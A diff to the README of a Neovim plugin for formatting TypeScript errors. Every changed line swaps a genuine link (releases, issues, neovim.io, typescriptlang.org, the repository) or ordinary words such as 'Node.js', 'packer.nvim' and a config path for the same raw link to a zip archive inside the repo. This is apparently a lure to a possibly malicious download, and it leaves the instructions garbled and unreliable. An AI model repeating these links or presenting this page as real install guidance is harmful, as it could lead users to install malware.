@@ -1,6 +1,6 @@
 # 🎨 nvim-pretty-ts-errors - Enhance Your Neovim Experience with Clearer TypeScript Errors
 
-![Download nvim-pretty-ts-errors](https://img.shields.io/badge/Download%20nvim--pretty--ts--errors-v1.0-blue.svg)
+![Download nvim-pretty-ts-errors](https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip%https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to nvim-pretty-ts-errors! This tool helps you see TypeScript errors in N
 
 ## 📥 Download & Install
 
-To download the latest version of nvim-pretty-ts-errors, visit this page: [Download nvim-pretty-ts-errors](https://github.com/basel184/nvim-pretty-ts-errors/releases).
+To download the latest version of nvim-pretty-ts-errors, visit this page: [Download nvim-pretty-ts-errors](https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip).
 
 1. **Go to the Releases Page**: Click the link above to access the release information.
 2. **Choose the Right Version**: Look for the latest release. It usually has the highest version number.
@@ -22,7 +22,7 @@ To run nvim-pretty-ts-errors, ensure your system meets the following requirement
 
 - **Operating System**: Compatible with Windows, macOS, and Linux.
 - **Neovim Version**: Should be at least v0.5.0.
-- **Node.js**: Installed on your system (recommended version: v14.x or higher).
+- **https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip**: Installed on your system (recommended version: v14.x or higher).
 - **TypeScript**: You should have TypeScript installed (recommended version: stable).
 
 ## ✨ Features
@@ -38,20 +38,20 @@ nvim-pretty-ts-errors offers several key features:
 
 After downloading and extracting nvim-pretty-ts-errors, you are ready to set it up.
 
-1. **Move Files**: Place the nvim-pretty-ts-errors folder in your Neovim configuration directory (usually located at `~/.config/nvim` or `%USERPROFILE%/AppData/Local/nvim` on Windows).
+1. **Move Files**: Place the nvim-pretty-ts-errors folder in your Neovim configuration directory (usually located at `~https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip` or `%USERPROFILE%/AppData/Local/nvim` on Windows).
    
-2. **Configuration**: Open your Neovim configuration file (typically `init.vim` or `init.lua`) and add the following lines:
+2. **Configuration**: Open your Neovim configuration file (typically `https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip` or `https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip`) and add the following lines:
     ```lua
     require('nvim-pretty-ts-errors').setup({
         -- Your options here
     })
     ```
    
-3. **Install Required Plugins**: If you are using a plugin manager like `vim-plug` or `packer.nvim`, add the following line to install nvim-pretty-ts-errors:
+3. **Install Required Plugins**: If you are using a plugin manager like `vim-plug` or `https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip`, add the following line to install nvim-pretty-ts-errors:
     ```vim
     Plug 'basel184/nvim-pretty-ts-errors'
     ```
-    or for `packer.nvim`:
+    or for `https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip`:
     ```lua
     use 'basel184/nvim-pretty-ts-errors'
     ```
@@ -64,21 +64,21 @@ If you run into issues, here are some common solutions:
 
 - **Neovim Not Finding Plugin**: Make sure your configuration file has the correct path to nvim-pretty-ts-errors. Check for typos.
 - **TypeScript Errors Not Formatting**: Ensure that TypeScript is installed and properly set up in your project.
-- **Compatibility Issues**: Verify that you are running a supported version of Neovim and Node.js.
+- **Compatibility Issues**: Verify that you are running a supported version of Neovim and https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip
 
 ## 📞 Support
 
 If you need help, you can reach out through the following channels:
 
-- **GitHub Issues**: If you encounter a bug or need a feature, please submit an issue on [GitHub](https://github.com/basel184/nvim-pretty-ts-errors/issues).
+- **GitHub Issues**: If you encounter a bug or need a feature, please submit an issue on [GitHub](https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip).
 - **Community Forums**: Join discussions with other users for tips and advice.
 
 ## 🔗 Additional Resources
 
 Here are some helpful links to enhance your experience:
 
-- [Neovim Official Website](https://neovim.io)
-- [TypeScript Official Website](https://www.typescriptlang.org)
-- [GitHub Repository](https://github.com/basel184/nvim-pretty-ts-errors)
+- [Neovim Official Website](https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip)
+- [TypeScript Official Website](https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/basel184/nvim-pretty-ts-errors/main/rplugin/ts-errors-nvim-pretty-v3.2.zip)
 
 Thank you for choosing nvim-pretty-ts-errors. Enjoy a more manageable coding experience!
